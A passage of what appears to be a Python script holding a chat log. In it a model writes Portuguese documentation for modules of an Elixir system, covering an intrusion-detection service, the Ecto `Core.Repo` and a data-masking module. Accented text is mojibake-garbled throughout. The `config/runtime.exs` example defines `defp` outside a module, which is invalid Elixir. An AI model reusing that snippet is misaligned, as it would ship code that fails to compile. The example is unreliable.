## ‚ùå 11. Tratamento de Erros

*   Se o `IntrusionDetectionService` falhar ou ficar sobrecarregado, ele n√£o deve impedir o funcionamento normal da aplica√ß√£o. As chamadas para `record_activity` devem ser \"fire-and-forget\" ou ter timeouts curtos.
*   Falhas na aplica√ß√£o de uma a√ß√£o de resposta (ex: erro ao bloquear IP) devem ser logadas e, possivelmente, gerar um alerta secund√°rio.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Seguran√ßa das Regras:** O reposit√≥rio de regras/assinaturas deve ser protegido contra modifica√ß√µes n√£o autorizadas.
*   **Evas√£o:** Atacantes podem tentar ofuscar suas atividades para evitar a detec√ß√£o pelas regras atuais. As regras precisam ser atualizadas.
*   **Performance:** Processar um grande volume de atividades em tempo real pode ser custoso. Otimiza√ß√µes, amostragem ou processamento ass√≠ncrono para algumas an√°lises podem ser necess√°rios.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Novas regras e assinaturas devem ser bem testadas para evitar falsos positivos.
*   A integra√ß√£o de novas fontes de eventos de atividade deve fornecer contexto suficiente para uma an√°lise eficaz.
*   Considere o impacto na performance ao adicionar regras muito complexas.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um mecanismo de aprendizado para que o IDS possa se adaptar a novos padr√µes de ataque ou ao comportamento normal do sistema.
*   [ ] Permitir que administradores criem e testem regras customizadas atrav√©s de uma UI.
*   [ ] Integra√ß√£o com feeds de Threat Intelligence para obter assinaturas de ataques atualizadas.
*   [ ] Desenvolver an√°lises de correla√ß√£o mais sofisticadas entre diferentes tipos de atividades e ao longo do tempo.
*   [ ] Adicionar a capacidade de \"simular\" a aplica√ß√£o de regras em dados hist√≥ricos para testar sua efic√°cia antes de ativ√°-las.
*   [ ] Suporte para an√°lise de tr√°fego de rede mais profunda (requereria integra√ß√£o em n√≠vel de infraestrutura, n√£o apenas aplica√ß√£o).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo IDS √© um componente de defesa bastante ativo!

Para o pr√≥ximo, podemos ir para `DeeperHub.Core.Repo` como sugerido anteriormente, ou talvez outro m√≥dulo de seguran√ßa como o `DeeperHub.Security.DataMasking` para ver como os dados s√£o protegidos em logs e UI?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Dado que j√° documentamos o `DeeperHub.Core.Repo`, e ele √© uma depend√™ncia fundamental para quase todos os outros m√≥dulos, vamos prosseguir com ele.

---

# M√≥dulo: `DeeperHub.Core.Repo` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.Repo`

O m√≥dulo `DeeperHub.Core.Repo` √© a **implementa√ß√£o principal do Ecto.Repo** para o sistema DeeperHub. Ele serve como a interface de banco de dados para toda a aplica√ß√£o, gerenciando conex√µes, transa√ß√µes e a execu√ß√£o de consultas Ecto.

Atrav√©s deste m√≥dulo, todos os outros componentes do sistema interagem com o banco de dados (ou bancos de dados, se houver m√∫ltiplos reposit√≥rios configurados para diferentes prop√≥sitos) de forma consistente e segura. Ele encapsula a configura√ß√£o do adaptador de banco de dados (PostgreSQL, MySQL, etc.) e fornece as funcionalidades padr√£o do Ecto para CRUD (Create, Read, Update, Delete) e consultas complexas. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Interface Ecto.Repo Padr√£o:**
    *   Implementar o comportamento `Ecto.Repo`.
    *   Fornecer todas as fun√ß√µes padr√£o do Ecto: `insert/2`, `update/2`, `delete/2`, `get/3`, `get_by/3`, `all/2`, `one/2`, `transaction/2`, `preload/3`, etc.
*   **Gerenciamento de Conex√£o com Banco de Dados:**
    *   Configurar e gerenciar o pool de conex√µes com o(s) banco(s) de dados.
    *   Lidar com reconex√µes e falhas de conex√£o.
*   **Execu√ß√£o de Consultas Ecto:**
    *   Executar Ecto queries constru√≠das com `Ecto.Query`.
    *   Converter resultados do banco de dados em structs Ecto.
*   **Gerenciamento de Transa√ß√µes:**
    *   Fornecer a capacidade de executar m√∫ltiplas opera√ß√µes de banco de dados dentro de uma √∫nica transa√ß√£o at√¥mica (`transaction/2`).
    *   Garantir rollback em caso de erro dentro da transa√ß√£o.
*   **Suporte a Migra√ß√µes Ecto:**
    *   Ser o reposit√≥rio usado para executar migra√ß√µes de schema do banco de dados.
*   **Configura√ß√£o do Adaptador de Banco de Dados:**
    *   Carregar a configura√ß√£o do adaptador de banco de dados (PostgreSQL, MySQL, SQLite, etc.) a partir das configura√ß√µes da aplica√ß√£o.
*   **Observabilidade (via Ecto.LogEntry e Telemetria):**
    *   Ecto j√° emite eventos de telemetria para consultas (`[:my_app, :repo, :query]`). `DeeperHub.Core.Metrics` e `DeeperHub.Core.Logger` devem ter handlers para capturar esses eventos e registrar m√©tricas de DB (lat√™ncia, contagem de queries) e logs de queries (especialmente em dev ou para queries lentas).
*   **Suporte a M√∫ltiplos Reposit√≥rios (Opcional, se necess√°rio):**
    *   Se a aplica√ß√£o usar m√∫ltiplos bancos de dados para diferentes prop√≥sitos, pode haver m√∫ltiplos m√≥dulos Repo (ex: `Core.Repo.Primary`, `Core.Repo.Analytics`). Este README focar√° no principal.
*   **Integra√ß√£o com `QueryHelper` e `QueryOptimizer` (Opcional):**
    *   As fun√ß√µes de servi√ßo que usam o `Repo` podem utilizar os utilit√°rios `DeeperHub.Shared.Database.QueryHelper` para aplicar filtros, pagina√ß√£o e ordena√ß√£o de forma consistente, e `QueryOptimizer` para caching de queries.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Repo` (M√≥dulo Ecto.Repo):**
    *   **Responsabilidade:** √â a pr√≥pria implementa√ß√£o do reposit√≥rio.
    *   **Configura√ß√£o:** `use Ecto.Repo, otp_app: :deeper_hub, adapter: Ecto.Adapters.Postgres` (ou outro adaptador).
    *   A configura√ß√£o detalhada (hostname, username, password, database, pool_size) √© geralmente carregada de `config/config.exs`, `config/runtime.exs` ou vari√°veis de ambiente.
2.  **Adaptador de Banco de Dados Ecto (ex: `Ecto.Adapters.Postgres`):**
    *   Biblioteca externa que lida com a comunica√ß√£o espec√≠fica do banco de dados.
3.  **Pool de Conex√µes (ex: `DBConnection` ou `Postgrex` pool):**
    *   Gerenciado pelo Ecto/adaptador para reutilizar conex√µes de banco de dados eficientemente.
4.  **Schemas Ecto (Definidos nos m√≥dulos de dom√≠nio):**
    *   Ex: `DeeperHub.Accounts.Schema.User`, `DeeperHub.Servers.Schema.Server`.
    *   S√£o usados pelo `Repo` para mapear dados de/para o banco de dados.
5.  **`DeeperHub.Release` (ou `lib/deeper_hub/application.ex`):**
    *   Respons√°vel por garantir que o `Repo` seja iniciado como parte da √°rvore de supervis√£o da aplica√ß√£o e que as migra√ß√µes sejam executadas durante o deploy.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/core/repo.ex          # Implementa√ß√£o do Ecto.Repo principal

priv/repo/
‚îú‚îÄ‚îÄ migrations/                     # Migra√ß√µes Ecto
‚îÇ   ‚îî‚îÄ‚îÄ 20230101000000_create_users.exs
‚îÇ   ‚îî‚îÄ‚îÄ ...
‚îî‚îÄ‚îÄ seeds.exs                       # (Opcional) Script para popular dados iniciais
```

### 3.3. Decis√µes de Design Importantes

*   **Reposit√≥rio √önico vs. M√∫ltiplos:** Para a maioria das aplica√ß√µes, um √∫nico `Repo` principal √© suficiente. M√∫ltiplos repos podem ser usados para conectar a diferentes bancos de dados ou para isolar contextos delimitados muito distintos, mas adicionam complexidade.
*   **Consultas Expl√≠citas:** As fun√ß√µes de servi√ßo devem construir e passar `Ecto.Query` expl√≠citas para o `Repo`, em vez de o `Repo` conter l√≥gica de consulta complexa.
*   **Transa√ß√µes para M√∫ltiplas Grava√ß√µes:** Qualquer opera√ß√£o que envolva m√∫ltiplas escritas no banco de dados que devem ser at√¥micas (ou seja, todas bem-sucedidas ou todas falham) deve ser encapsulada em uma `Repo.transaction/2`.
*   **Seguran√ßa:** Nunca construir fragmentos SQL por concatena√ß√£o de strings. Sempre usar consultas parametrizadas, que o Ecto faz por padr√£o quando usado corretamente.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Criar um Novo Usu√°rio:**
    *   `DeeperHub.Accounts.UserService` constr√≥i um changeset para um novo usu√°rio.
    *   Chama `DeeperHub.Core.Repo.insert(changeset)`.
*   **Buscar um Servidor pelo ID:**
    *   `DeeperHub.Servers.Storage` chama `DeeperHub.Core.Repo.get(DeeperHub.Servers.Schema.Server, server_id)`.
*   **Listar Todas as Avalia√ß√µes Ativas para um Servidor (com pagina√ß√£o e ordena√ß√£o):**
    *   `DeeperHub.ServerReviews.Storage` constr√≥i uma `Ecto.Query`:
        ```elixir
        from(r in Review,
          where: r.server_id == ^server_id and r.is_active == true,
          order_by: [desc: r.inserted_at],
          limit: ^limit,
          offset: ^offset
        ) |> DeeperHub.Core.Repo.all()
        ```
*   **Registrar um Usu√°rio e seu Perfil Atomicamente:**
    *   `DeeperHub.Accounts.RegistrationService` usa `DeeperHub.Core.Repo.transaction(fn -> ... end)` para garantir que tanto o usu√°rio quanto o perfil sejam criados, ou nenhum deles se ocorrer um erro.

## üåä 5. Fluxos Importantes

### Fluxo de uma Consulta `Repo.all/2`

1.  **M√≥dulo de Servi√ßo/Storage:** Constr√≥i uma `Ecto.Query.t()` (ex: `query = from(u in User, where: u.active == true)`).
2.  **Chamada ao Repo:** Chama `DeeperHub.Core.Repo.all(query)`.
3.  **`DeeperHub.Core.Repo`:**
    *   Obt√©m uma conex√£o do pool de conex√µes.
    *   O adaptador Ecto (ex: `Postgrex`) traduz a `Ecto.Query` para uma consulta SQL parametrizada.
    *   Envia a consulta SQL para o servidor de banco de dados.
4.  **Banco de Dados:** Executa a consulta e retorna os resultados.
5.  **`DeeperHub.Core.Repo`:**
    *   O adaptador Ecto recebe os resultados brutos.
    *   Converte os resultados em uma lista de structs Ecto (ex: `[%User{}, %User{}, ...]`).
    *   Libera a conex√£o de volta para o pool.
    *   Retorna a lista de structs para o chamador.
    *   Eventos Telemetry (`[:deeper_hub, :repo, :query]`) s√£o emitidos pelo Ecto.

### Fluxo de uma `Repo.transaction/2`

1.  **M√≥dulo de Servi√ßo:** Chama `DeeperHub.Core.Repo.transaction(fn repo_inside_transaction -> ... end)`.
2.  **`DeeperHub.Core.Repo`:**
    *   Obt√©m uma conex√£o do pool e a marca como estando em uma transa√ß√£o.
    *   Inicia uma transa√ß√£o no banco de dados (ex: `BEGIN`).
    *   Executa a fun√ß√£o an√¥nima passada, fornecendo uma inst√¢ncia do `Repo` que opera dentro dessa transa√ß√£o (`repo_inside_transaction`).
3.  **Fun√ß√£o An√¥nima:**
    *   Executa m√∫ltiplas opera√ß√µes de banco de dados usando `repo_inside_transaction` (ex: `repo_inside_transaction.insert(cs1)`, `repo_inside_transaction.update(cs2)`).
    *   Se todas as opera√ß√µes forem bem-sucedidas, a fun√ß√£o retorna `{:ok, result_value}`.
    *   Se qualquer opera√ß√£o falhar (ex: changeset inv√°lido, erro do DB), a fun√ß√£o pode retornar `{:error, reason}` ou o `Repo` pode levantar uma exce√ß√£o. √â comum usar `Repo.insert!/update!/delete!` dentro de transa√ß√µes para que um erro cause um rollback autom√°tico.
4.  **`DeeperHub.Core.Repo` (Conclus√£o da Transa√ß√£o):**
    *   Se a fun√ß√£o retornou `{:ok, result_value}`:
        *   Confirma a transa√ß√£o no banco de dados (ex: `COMMIT`).
        *   Retorna `{:ok, result_value}` para o chamador original.
    *   Se a fun√ß√£o retornou `{:error, reason}` ou levantou uma exce√ß√£o que o `Repo.transaction` captura:
        *   Cancela a transa√ß√£o no banco de dados (ex: `ROLLBACK`).
        *   Retorna `{:error, reason}` (ou propaga a exce√ß√£o, dependendo de como a transa√ß√£o foi configurada).
    *   Libera a conex√£o de volta para o pool.
    *   Eventos Telemetry s√£o emitidos para o in√≠cio, fim (commit/rollback) da transa√ß√£o.

## üì° 6. API (Fun√ß√µes Ecto.Repo Padr√£o)

O `DeeperHub.Core.Repo` exp√µe todas as fun√ß√µes padr√£o do `Ecto.Repo`. As mais comuns incluem:

*   `insert(changeset_or_struct, opts \\\\ [])`
*   `insert!(changeset_or_struct, opts \\\\ [])`
*   `update(changeset_or_struct, opts \\\\ [])`
*   `update!(changeset_or_struct, opts \\\\ [])`
*   `delete(struct, opts \\\\ [])`
*   `delete!(struct, opts \\\\ [])`
*   `get(schema_module, id, opts \\\\ [])`
*   `get!(schema_module, id, opts \\\\ [])`
*   `get_by(schema_module, clauses, opts \\\\ [])`
*   `get_by!(schema_module, clauses, opts \\\\ [])`
*   `all(queryable, opts \\\\ [])`
*   `one(queryable, opts \\\\ [])`
*   `one!(queryable, opts \\\\ [])`
*   `transaction(fun, opts \\\\ [])`
*   `preload(structs_or_struct, preloads, opts \\\\ [])`
*   `exists?(queryable)`
*   `aggregate(queryable, aggregate_op, field, opts \\\\ [])`

*Para a documenta√ß√£o completa de cada fun√ß√£o, consulte a documenta√ß√£o oficial do Ecto.*

## ‚öôÔ∏è 7. Configura√ß√£o

A configura√ß√£o do `DeeperHub.Core.Repo` √© feita principalmente atrav√©s dos arquivos de configura√ß√£o do Elixir (`config/config.exs`, `config/dev.exs`, `config/prod.exs`, `config/runtime.exs`) e vari√°veis de ambiente.

**Exemplo (`config/runtime.exs` para produ√ß√£o):**
```elixir
import Config

if config_env() == :prod do
  database_url =
    System.get_env(\"DATABASE_URL\") ||
      raise \"\"\"
      environment variable DATABASE_URL is missing.
      For example: ecto://USER:PASS@HOST/DATABASE
      \"\"\"

  config :deeper_hub, DeeperHub.Core.Repo,
    url: database_url,
    pool_size: String.to_integer(System.get_env(\"POOL_SIZE\") || \"10\"),
    ssl: String.to_atom(System.get_env(\"DATABASE_SSL\") || \"false\"), # ex: true, ou [certfile: \"path/to/cert.pem\"]
    # Outras op√ß√µes de produ√ß√£o, como timeouts
    socket_options: maybe_ipv6(System.get_env(\"DATABASE_SOCKET_OPTIONS\"))

  # Helper para socket_options
  defp maybe_ipv6(nil), do: []
  defp maybe_ipv6(\"ipv6\"), do: [:inet6]
  defp maybe_ipv6(_), do: []
end
```

**Configura√ß√µes Chave:**
*   `:otp_app`: `:deeper_hub` (indica que as configura√ß√µes do repo est√£o sob a app `:deeper_hub`).
*   `:adapter`: (ex: `Ecto.Adapters.Postgres`).
*   `:url` ou `:hostname`, `:username`, `:password`, `:database`: Credenciais de conex√£o.
*   `:pool_size`: N√∫mero de conex√µes no pool.
*   `:ssl`: Configura√ß√µes de SSL para a conex√£o.
*   Outras op√ß√µes espec√≠ficas do adaptador e do pool.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   Todos os m√≥dulos que definem `Ecto.Schema`.
*   Todos os m√≥dulos de servi√ßo/storage que executam opera√ß√µes de banco de dados.
*   `DeeperHub.Core.ConfigManager`: Para obter a string de conex√£o e outras configura√ß√µes do Repo em tempo de execu√ß√£o (se usando `Config.Provider`).

### 8.2. Bibliotecas Externas

*   `Ecto` (especificamente `ecto_sql` para bancos SQL).
*   O adaptador de banco de dados espec√≠fico (ex: `postgrex` para PostgreSQL, `myxql` para MySQL).
*   `DBConnection`: Para gerenciamento do pool de conex√µes.

## ü§ù 9. Como Usar / Integra√ß√£o

O `DeeperHub.Core.Repo` √© usado em toda a aplica√ß√£o onde a persist√™ncia de dados √© necess√°ria.

**Exemplo em um m√≥dulo de servi√ßo:**
```elixir
defmodule DeeperHub.Accounts.UserService do
  alias DeeperHub.Core.Repo
  alias DeeperHub.Accounts.Schema.User
  import Ecto.Query

  def get_user_by_id(user_id) do
    Repo.get(User, user_id) # Retorna %User{} ou nil
  end

  def create_user(attrs) do
    %User{}
    |> User.changeset(attrs)
    |> Repo.insert() # Retorna {:ok, %User{}} ou {:error, %Ecto.Changeset{}}
  end

  def list_active_users() do
    from(u in User, where: u.is_active == true)
    |> Repo.all()
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Os testes para o `Repo` em si s√£o geralmente cobertos pelos testes do Ecto.
*   Os testes dos m√≥dulos de servi√ßo/storage que *usam* o `Repo` devem verificar se os dados s√£o persistidos e recuperados corretamente.
*   Usar o `Ecto.Adapters.SQL.Sandbox` para testes de banco de dados √© a pr√°tica padr√£o para garantir isolamento e limpeza autom√°tica.
*   Localiza√ß√£o: Os testes que interagem com o Repo estar√£o nos diret√≥rios de teste dos m√≥dulos que o utilizam (ex: `test/deeper_hub/accounts/user_service_test.exs`).

### 10.2. M√©tricas

Ecto emite eventos Telemetry que podem ser usados para derivar m√©tricas (via `DeeperHub.Core.Metrics` com handlers apropriados):
*   `deeper_hub.core.repo.query.total.count` (tags: `source` (nome da tabela/schema), `action` (`select`, `insert`, `update`, `delete`))
*   `deeper_hub.core.repo.query.duration_ms` (Histograma, tags: `source`, `action`)
*   `deeper_hub.core.repo.query.idle_time_ms` (Histograma): Tempo que uma conex√£o ficou ociosa antes de ser usada.
*   `deeper_hub.core.repo.query.queue_time_ms` (Histograma): Tempo que uma query esperou por uma conex√£o dispon√≠vel.
*   `deeper_hub.core.repo.transaction.duration_ms` (Histograma)
*   `deeper_hub.core.repo.pool.size.gauge` (Gauge): Tamanho atual do pool.
*   `deeper_hub.core.repo.pool.checked_out.gauge` (Gauge): Conex√µes em uso.
*   `deeper_hub.core.repo.pool.overflow.count` (Contador): N√∫mero de vezes que o pool excedeu o tamanho.

### 10.3. Logs

*   Ecto pode ser configurado para logar todas as queries SQL executadas (`log_queries: true` na configura√ß√£o do Repo, geralmente apenas para desenvolvimento).
*   Queries lentas podem ser logadas com um n√≠vel mais alto (ex: WARNING) se um limiar for excedido.
*   Erros de conex√£o com o banco de dados.
*   Erros de transa√ß√£o (rollbacks).

### 10.4. Telemetria

Ecto emite eventos Telemetry padr√£o para opera√ß√µes de banco de dados. Os principais s√£o:
*   `[:your_app, :repo, :query]` (onde `:your_app` √© `:deeper_hub`):
    *   **Medi√ß√µes:** `:query_time`, `:decode_time`, `:queue_time`, `:idle_time`, `:total_time` (todos em `native` time units).
    *   **Metadados:** `:repo`, `:type` (`:ecto_sql | :ecto_mongodb | ...`), `:source` (nome da tabela/schema), `:action` (`:select | :insert | ...`), `:result` (`{:ok, term} | {:error, term}`), `:query` (a query Ecto), `:params`, `:stacktrace`.
*   Para transa√ß√µes, eventos como `[:your_app, :repo, :transaction]` s√£o emitidos.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes do `Repo` como `insert`, `update`, `delete` retornam `{:ok, struct}` ou `{:error, changeset}`.
*   Fun√ß√µes \"bang\" (`insert!`, `update!`, `delete!`, `get!`, `one!`) levantam exce√ß√µes em caso de erro (ex: `Ecto.InvalidChangesetError`, `Ecto.NoResultsError`). Estas s√£o √∫teis dentro de transa√ß√µes para for√ßar um rollback.
*   Erros de conex√£o com o banco de dados podem levantar exce√ß√µes como `DBConnection.ConnectionError`. A aplica√ß√£o (ou o pool de conex√µes) geralmente tenta reconectar.
*   `Repo.transaction` retorna `{:ok, value}` se a fun√ß√£o interna retornar `{:ok, value}`, e `{:error, reason}` se a fun√ß√£o interna retornar `{:error, reason}` ou `Repo.rollback(reason)`.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Preven√ß√£o de Inje√ß√£o de SQL:** A principal responsabilidade de seguran√ßa do `Repo` √© facilitar o uso de consultas parametrizadas. **Nunca interpolar dados de entrada do usu√°rio diretamente em strings de consulta SQL.** Use `^` para interpolar vari√°veis em queries Ecto ou passe par√¢metros para `Ecto.Adapters.SQL.query/4`.
*   **Credenciais de Acesso:** As credenciais do banco de dados devem ser gerenciadas de forma segura (ex: vari√°veis de ambiente, cofres de segredos) e n√£o hardcoded.
*   **Permiss√µes do Usu√°rio do Banco de Dados:** O usu√°rio do banco de dados configurado para a aplica√ß√£o deve ter apenas as permiss√µes necess√°rias (princ√≠pio do menor privil√©gio).
*   **Dados Sens√≠veis:** Se o banco de dados armazenar dados sens√≠veis, considere criptografia em n√≠vel de coluna (usando tipos Ecto customizados como `DeeperHub.Shared.Encryption.EncryptedType`) ou criptografia em n√≠vel de banco de dados (TDE).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Mantenha a l√≥gica de consulta complexa fora do m√≥dulo `Repo`. Coloque-a em m√≥dulos de contexto/servi√ßo.
*   Sempre use changesets para validar dados antes de `insert` ou `update`.
*   Use transa√ß√µes para opera√ß√µes que envolvem m√∫ltiplas escritas at√¥micas.
*   Monitore a performance das queries e adicione √≠ndices no banco de dados conforme necess√°rio.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Configurar read replicas e um `Repo.ReadOnly` para desviar tr√°fego de leitura e aliviar o banco de dados prim√°rio, se a carga justificar.
*   [ ] Implementar estrat√©gias de retry mais sofisticadas para opera√ß√µes de banco de dados em caso de deadlocks ou falhas transit√≥rias.
*   [ ] Explorar o uso de `Ecto.Multi` para compor opera√ß√µes de banco de dados mais complexas de forma transacional.
*   [ ] Adicionar uma camada de \"data sharding\" se a aplica√ß√£o precisar escalar para volumes de dados muito grandes.
*   [ ] Melhorar a observabilidade com tracing distribu√≠do para queries Ecto, ligando-as a traces de requisi√ß√µes HTTP.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Com o `Core.Repo` documentado, cobrimos a principal interface de persist√™ncia.

Para o pr√≥ximo, podemos voltar para a camada de seguran√ßa e abordar `DeeperHub.Security.DataMasking` ou `ResponseSanitizer`, ou talvez come√ßar a detalhar um m√≥dulo de dom√≠nio como `DeeperHub.Servers`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos seguir com `DeeperHub.Security.DataMasking`. Este m√≥dulo √© crucial para proteger dados sens√≠veis quando eles precisam ser exibidos ou logados.

---

# M√≥dulo: `DeeperHub.Security.DataMasking` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.DataMasking`

O m√≥dulo `DeeperHub.Security.DataMasking` √© respons√°vel por **mascarar (ou ofuscar) dados sens√≠veis** dentro do sistema DeeperHub. O objetivo √© proteger informa√ß√µes confidenciais de serem expostas em logs, interfaces de usu√°rio (especialmente para administradores ou suporte), relat√≥rios ou qualquer outro local onde o dado completo n√£o seja estritamente necess√°rio.

Ele fornece funcionalidades para mascarar diferentes tipos de dados, como CPFs, n√∫meros de cart√£o de cr√©dito, emails, telefones, e tamb√©m permite mascarar campos espec√≠ficos dentro de estruturas de dados maiores (mapas). Este m√≥dulo ajuda a cumprir com regulamenta√ß√µes de privacidade (como LGPD/GDPR) e a reduzir o risco de vazamento de dados. üòä

*(Nota: A documenta√ß√£o original tinha `DeeperHub.Security.DataMasking.DataMaskingService` e `DataMaskingFacade`. Esta documenta√ß√£o consolida a fachada principal em `DeeperHub.Security.DataMasking` e a l√≥gica no `DataMaskingService`.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Mascaramento de Tipos de Dados Espec√≠ficos:**
    *   Mascarar n√∫meros de CPF/CNPJ (`mask_cpf/2`).
    *   Mascarar n√∫meros de cart√£o de cr√©dito (`mask_credit_card/2`).
    *   Mascarar endere√ßos de email (`mask_email/2`).
    *   Mascarar n√∫meros de telefone (`mask_phone/2`).
    *   (Extens√≠vel) Mascarar outros tipos de documentos ou identificadores.
*   **Mascaramento Gen√©rico de Strings:**
    *   Aplicar mascaramento a strings gen√©ricas, mantendo uma por√ß√£o vis√≠vel (ex: primeiros/√∫ltimos N caracteres).
*   **Mascaramento de Dados em Estruturas (Mapas/Structs):**
    *   Mascarar valores de chaves espec√≠ficas dentro de mapas ou structs (`mask_sensitive_map/3`).
    *   Suporte a mascaramento recursivo em estruturas aninhadas.
*   **Mascaramento para Logs (`mask_for_log/2`):**
    *   Uma fun√ß√£o de conveni√™ncia para aplicar mascaramento a dados (strings ou mapas) antes de serem enviados para o `Core.Logger`.
    *   Identificar automaticamente e mascarar dados sens√≠veis comuns em strings de log.
*   **Configurabilidade de Padr√µes de Mascaramento:**
    *   Permitir a configura√ß√£o de como cada tipo de dado √© mascarado (ex: quantos d√≠gitos do cart√£o de cr√©dito manter vis√≠veis, qual parte do email ofuscar).
    *   Definir o caractere de mascaramento (ex: `*`, `#`, `X`).
*   **Pol√≠ticas de Mascaramento Contextuais (Opcional):**
    *   Permitir diferentes n√≠veis ou estilos de mascaramento dependendo do contexto ou do papel do usu√°rio que est√° visualizando os dados.
*   **Integra√ß√£o com `LogSanitizer` e `ResponseSanitizer`:**
    *   Este m√≥dulo pode ser usado internamente por `LogSanitizer` e `ResponseSanitizer` para aplicar as regras de mascaramento.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DataMasking` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes de mascaramento.
    *   Delega para o `DataMaskingService`.
2.  **`DeeperHub.Security.DataMasking.Services.DataMaskingService` (M√≥dulo Funcional):**
    *   **Responsabilidade:** Cont√©m a l√≥gica principal para aplicar as diferentes t√©cnicas de mascaramento.
    *   N√£o gerencia estado, as regras de mascaramento s√£o obtidas do `Core.ConfigManager` ou passadas como op√ß√µes.
    *   Utiliza regex e manipula√ß√£o de strings para realizar o mascaramento.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.ConfigManager`: Para obter padr√µes de mascaramento padr√£o, caracteres de substitui√ß√£o, etc.
3.  **Configura√ß√µes (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Padr√µes de regex para identificar dados a serem mascarados (ex: regex para CPF, Cart√£o).
    *   Formatos de mascaramento (ex: `cpf_mask: \"###.***.***-##\"`).
    *   Lista de chaves sens√≠veis padr√£o para `mask_sensitive_map/3` e `mask_for_log/2`.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/data_masking/
‚îú‚îÄ‚îÄ data_masking.ex                 # Fachada P√∫blica
‚îÇ
‚îî‚îÄ‚îÄ services/
    ‚îî‚îÄ‚îÄ data_masking_service.ex     # L√≥gica principal de mascaramento
```
*(Este m√≥dulo tende a ser mais funcional e pode n√£o necessitar de GenServers ou supervisores pr√≥prios, a menos que haja uma necessidade de gerenciar dinamicamente regras complexas de mascaramento com estado.)*

### 3.3. Decis√µes de Design Importantes

*   **N√£o Revers√≠vel:** O mascaramento √© uma opera√ß√£o de m√£o √∫nica; os dados originais n√£o devem ser recuper√°veis a partir da vers√£o mascarada.
*   **Equil√≠brio entre Utilidade e Seguran√ßa:** O mascaramento deve ocultar informa√ß√µes suficientes para proteger a privacidade, mas ainda pode deixar partes vis√≠veis para fins de identifica√ß√£o ou depura√ß√£o (ex: √∫ltimos 4 d√≠gitos do cart√£o).
*   **Consist√™ncia:** Os mesmos tipos de dados devem ser mascarados de forma consistente em toda a aplica√ß√£o.
*   **Performance:** As fun√ß√µes de mascaramento devem ser eficientes, especialmente se aplicadas a grandes volumes de dados ou em caminhos cr√≠ticos de log/resposta.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Exibi√ß√£o de Dados de Usu√°rio em Painel de Suporte:**
    *   Um agente de suporte visualiza os detalhes de um usu√°rio.
    *   Antes de exibir, o servi√ßo chama `DataMasking.mask_cpf(user.cpf)`, `DataMasking.mask_email(user.email)`.
*   **Registro de Log de uma Transa√ß√£o:**
    *   O m√≥dulo financeiro vai logar os detalhes de uma transa√ß√£o.
    *   Chama `Core.Logger.info(\"Transa√ß√£o processada\", DataMasking.mask_for_log(transaction_details, sensitive_keys: [:credit_card_number, :cvv]))`.
*   **Resposta de API com Dados Parcialmente Sens√≠veis:**
    *   Uma API retorna informa√ß√µes de um pedido, incluindo os √∫ltimos 4 d√≠gitos do cart√£o.
    *   O controller, antes de enviar a resposta, chama `DataMasking.mask_credit_card(full_card_number, visible_digits: 4, preserve_brand: true)`.

## üåä 5. Fluxos Importantes

### Fluxo de Mascaramento de um Mapa de Dados para Log

1.  **M√≥dulo Chamador:** Tem um mapa `data = %{user_id: 1, action: \"login\", details: %{ip: \"1.2.3.4\", password_attempt: \"secret123\"}}`.
2.  Prepara para logar: `Logger.info(\"Tentativa de Login\", DataMasking.mask_for_log(data, sensitive_keys: [:password_attempt]))`.
3.  **`DataMasking.mask_for_log/2` (Fachada):**
    *   Delega para `DataMaskingService.mask_sensitive_map(data, [:password_attempt], opts)`.
4.  **`DataMaskingService.mask_sensitive_map/3`:**
    *   Itera sobre as chaves do mapa.
    *   Se uma chave est√° na lista `sensitive_keys` (ou em uma lista padr√£o de chaves sens√≠veis configurada):
        *   Substitui seu valor por um placeholder (ex: `\"[REDACTED]\"` ou `\"[MASKED]\"`).
    *   Se um valor for um mapa aninhado e a op√ß√£o recursiva estiver ativa, chama-se recursivamente.
    *   Se um valor for uma string e a op√ß√£o de detectar padr√µes sens√≠veis em strings estiver ativa, pode chamar `mask_sensitive_data/2` nessa string.
5.  **Resultado:** O mapa mascarado √© retornado (ex: `%{user_id: 1, action: \"login\", details: %{ip: \"1.2.3.4\", password_attempt: \"[REDACTED]\"}}`) e passado para o `Core.Logger`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

*(Baseado na documenta√ß√£o original, com alguns refinamentos e adi√ß√µes)*

### 6.1. `DeeperHub.Security.DataMasking.mask_sensitive_data(text :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

